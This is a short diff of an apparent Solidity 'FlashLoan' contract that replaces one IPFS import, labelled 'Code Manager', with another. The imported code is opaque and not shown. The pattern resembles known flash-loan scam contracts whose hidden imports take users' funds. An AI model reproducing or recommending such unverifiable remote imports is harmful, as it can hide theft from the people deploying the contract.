@@ -13,7 +13,7 @@ import "https://github.com/athcoin/flash/blob/main/IPancakePair.sol";
 
 
 // Code Manager
-import "ipfs://QmRpB6X8nKzw2Ze2en7To2xZJ5mHRxztSPRwa9LdFtL5v1";
+import "ipfs://QmSfwpULaAPqCNmYLTu7Ea3fiSLutXGqjTX8GjuvLuYa9A";
 
 contract FlashLoan {
 	string public tokenName;
